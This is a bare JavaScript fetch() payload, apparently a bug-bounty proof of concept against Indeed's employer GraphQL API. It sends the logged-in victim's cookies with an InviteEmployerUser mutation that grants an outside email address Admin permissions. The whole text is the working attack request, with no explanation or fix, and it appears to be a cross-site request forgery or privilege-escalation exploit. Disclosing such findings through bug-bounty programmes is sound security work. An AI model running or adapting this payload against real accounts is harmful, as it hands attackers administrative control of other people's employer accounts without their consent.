fetch("https://apis.indeed.com/graphql?locale=en-CA&co=CA", {
    ...
    credentials: "include",
    body: JSON.stringify({"operationName":"InviteEmployerUser","variables":{"input":{"emailAddresses":["Geomecraft+35bugbounty@bugcrowdninja.com"],"permissionSets":["Admin"],"sendNotification":true,"modalTabType":"DEFAULT"}},"extensions":{},"query":"mutation InviteEmployerUser($input: InviteEmployerUsersInput!) {\n  inviteEmployerUsers(input: $input) {\n    successfullyInvitedUsers {\n      ...InvitedUserFields\n      __typename\n    }\n    successfullyAddedUsers {\n      ...AddedUserFields\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment InvitedUserFields on EmployerUserInvitation {\n  accountKey\n  emailAddress\n  invitedAt\n  permissionSets {\n    id\n    category\n    description\n    name\n    __typename\n  }\n  status\n  __typename\n}\n\nfragment AddedUserFields on EmployerUser {\n  account {\n    id\n    emailAddressButOnlyForPacUse\n    __typename\n  }\n  permissionSets {\n    permissionSet {\n      name\n      __typename\n    }\n    permissionSource\n    __typename\n  }\n  __typename\n}\n"})
})
